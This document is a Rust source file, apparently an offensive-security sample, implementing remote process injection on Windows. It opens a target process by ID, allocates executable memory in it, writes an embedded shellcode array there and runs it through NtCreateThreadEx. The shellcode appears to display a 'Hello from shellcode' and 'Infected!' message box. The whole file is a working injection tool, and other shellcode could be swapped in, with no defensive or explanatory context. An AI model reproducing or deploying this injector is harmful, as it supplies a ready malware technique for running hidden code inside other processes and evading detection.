use std::{ptr, ffi::c_void};
use windows::{
    Win32::{
        Foundation::{
            CloseHandle,
            BOOL, 
            HANDLE, 
            NTSTATUS
        },
        System::{
            Diagnostics::Debug::WriteProcessMemory,
            Memory::{
                VirtualAllocEx, 
                MEM_COMMIT, 
                MEM_RESERVE, 
                PAGE_EXECUTE_READWRITE
            },
            Threading::{
                OpenProcess, 
                WaitForSingleObject,
                PROCESS_ALL_ACCESS,
            },
        },
    },
};


#[link(name = "ntdll")]
unsafe extern "system" {
    pub fn NtCreateThreadEx(
        thread_handle: *mut HANDLE,
        desired_access: u32,
        object_attributes: *mut c_void,
        process_handle: HANDLE,
        start_address: *mut c_void,
        parameter: *mut c_void,
        create_flags: u32,
        zero_bits: usize,
        stack_size: usize,
        maximum_stack_size: usize,
        attribute_list: *mut c_void,
    ) -> NTSTATUS;
}

pub fn inject(pid: u32) -> windows::core::Result<()> {
    unsafe {
        let h_process = OpenProcess(PROCESS_ALL_ACCESS, BOOL(0), pid)?;
        assert!(h_process.0 != 0, "OpenProcess failed");

        let shellcode: [u8; 316] = [0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,
        0xff,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,
        0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x56,0x48,0x8b,0x52,
        0x18,0x48,0x8b,0x52,0x20,0x48,0x0f,0xb7,0x4a,0x4a,0x48,0x8b,
        0x72,0x50,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,
        0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,
        0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,
        0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,
        0x00,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,
        0x48,0x01,0xd0,0x50,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0x8b,
        0x48,0x18,0xe3,0x56,0x48,0xff,0xc9,0x4d,0x31,0xc9,0x41,0x8b,
        0x34,0x88,0x48,0x01,0xd6,0x48,0x31,0xc0,0x41,0xc1,0xc9,0x0d,
        0xac,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,
        0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,
        0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,
        0x01,0xd0,0x41,0x8b,0x04,0x88,0x41,0x58,0x41,0x58,0x5e,0x59,
        0x48,0x01,0xd0,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,
        0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,
        0x12,0xe9,0x4b,0xff,0xff,0xff,0x5d,0xe8,0x0b,0x00,0x00,0x00,
        0x75,0x73,0x65,0x72,0x33,0x32,0x2e,0x64,0x6c,0x6c,0x00,0x59,
        0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x49,0xc7,0xc1,0x00,
        0x00,0x00,0x00,0xe8,0x15,0x00,0x00,0x00,0x48,0x65,0x6c,0x6c,
        0x6f,0x20,0x66,0x72,0x6f,0x6d,0x20,0x73,0x68,0x65,0x6c,0x6c,
        0x63,0x6f,0x64,0x65,0x00,0x5a,0xe8,0x0a,0x00,0x00,0x00,0x49,
        0x6e,0x66,0x65,0x63,0x74,0x65,0x64,0x21,0x00,0x41,0x58,0x48,
        0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,0xd5,0x48,0x31,
        0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,0xd5];

        let remote_addr = VirtualAllocEx(
            h_process,
            None,
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );
        assert!(!remote_addr.is_null(), "VirtualAllocEx failed");

        WriteProcessMemory(
            h_process,
            remote_addr,
            shellcode.as_ptr() as _,
            shellcode.len(),
            None,
        ).expect("WriteProcessMemory failed");
        
        let mut h_thread: HANDLE = HANDLE(0);
        let status = NtCreateThreadEx(
            &mut h_thread,
            0x1FFFFF,
            ptr::null_mut(),
            h_process,
            remote_addr as *mut c_void,
            ptr::null_mut(),
            0,
            0,
            0,
            0,
            ptr::null_mut(),
        );
    
        assert!(
            status.0 == 0,
            "NtCreateThreadEx failed with NTSTATUS: 0x{:X}",
            status.0
        );

        WaitForSingleObject(h_thread, 5000);
        let _ = CloseHandle(h_thread);        
        return CloseHandle(h_process)
    }
}
